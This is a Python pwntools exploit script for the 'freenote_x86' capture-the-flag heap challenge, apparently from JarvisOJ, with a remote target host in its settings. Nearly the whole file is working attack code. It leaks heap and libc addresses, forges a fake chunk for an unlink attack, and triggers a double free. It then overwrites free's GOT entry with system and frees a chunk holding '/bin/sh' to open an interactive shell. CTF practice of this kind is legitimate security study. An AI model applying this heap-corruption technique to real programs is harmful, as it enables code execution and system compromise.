# coding:utf-8

from pwn import *

def new_note(length, content):
    p.recvuntil("Your choice: ")
    p.sendline(str(2))
    p.recvuntil("Length of new note: ")
    p.sendline(str(length))
    p.recvuntil("Enter your note: ")
    p.send(content)


def delete_note(note):
    p.recvuntil("Your choice: ")
    p.sendline(str(4))
    p.recvuntil("Note number: ")
    p.sendline(str(note))


def edit_note(note, length, content):
    p.recvuntil("Your choice: ")
    p.sendline(str(3))
    p.recvuntil("Note number: ")
    p.sendline(str(note))
    p.recvuntil("Length of note: ")
    p.sendline(str(length))
    p.recvuntil("Enter your note: ")
    p.send(content)


def list_note():
    p.recvuntil("Your choice: ")
    p.sendline(str(1))


def main():
    new_note(16, "a"*16)
    new_note(16, "b"*16)
    new_note(16, "c"*16)
    new_note(16, "d"*16)

    delete_note(0)
    delete_note(2)
    new_note(4, "a"*4)
    new_note(4 ,"a"*4)
    list_note()

    leak_data = p.recvuntil("aaaaaaaa")
    heap_addr = u32(leak_data[:-8][-4:])
    heap_a_ptr = heap_addr - 0x88*2 - 0xc00
    log.info("heap first ptr is %s ",hex(heap_a_ptr))

    leak_data = p.recvuntil("cccccccc")
    libc_addr = u32(leak_data[:-8][-4:])
    system_addr = libc_addr - 1531504
    log.info("system address is %s", hex(system_addr))

    delete_note(1)
    payload = p32(0) + p32(0x80)  # fake_chunk1 head
    payload += p32(heap_a_ptr-0xc) + p32(heap_a_ptr-0x8) # fake_chunk1 fd and bk
    payload += "\x00"*(0x80-0x10) # fake_chunk body
    payload += p32(0x80) + p32(0x88) # fake_chunk2 prev_size and size
    payload += "/bin/sh\x00" + "x00"*(0x20)
    # gdb.attach(p, "b* 0x080484F5")
    edit_note(0, len(payload), payload)
    delete_note(1)  # double free

    free_got = 0x0804a29c

    payload2 = p32(0x00000002) + p32(0x00000001) + p32(0x4) #
    payload2 += p32(free_got) + p32(0) + p32(0) + p32(heap_addr-0x80)
    payload2 += "\x00"*(0xf0-len(payload2))
    edit_note(0, 0xf0, payload2)
    edit_note(0, 0x4, p32(system_addr))

    delete_note(1)
    p.interactive()


if __name__ == '__main__':
    debug = 1
    if debug:
        context(os="linux", arch="i386", log_level="debug")
        context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
        env = {"LD_PRELOAD":"./libc-2.19.so"}
        p = process('./freenote_x86')

    else:
        p = remote("pwn2.jarvisoj.com", 9885)

    main()